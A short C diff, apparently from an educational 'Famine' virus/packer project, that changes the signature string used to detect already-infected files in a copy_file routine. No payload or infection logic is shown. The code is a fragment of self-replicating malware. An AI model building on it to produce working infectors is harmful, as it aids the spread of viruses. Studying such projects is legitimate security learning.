@@ -24,13 +24,11 @@ int copy_file(t_woody *woody, char *filename)
 	if (read(fd, woody->addr, woody->filesize) != woody->filesize)
 	{
 		close(fd);
-		// free(woody->addr);
 		return ERROR_CODE;
 	}
 	char * string = woody->addr;
 	for (int i = 0; i < woody->filesize; i++){
-		if (ft_strnstr(&string[i], "Famine version 1.0 (c)oded mar-2023 by jraye", 45) != NULL){
-			// printf("already crypted!");
+		if (ft_strnstr(&string[i], "Famine version 1.0 (c)oded mar-2023 by jraye-slynell", 53) != NULL){
 			return ERROR_CODE;
 		}
 	}
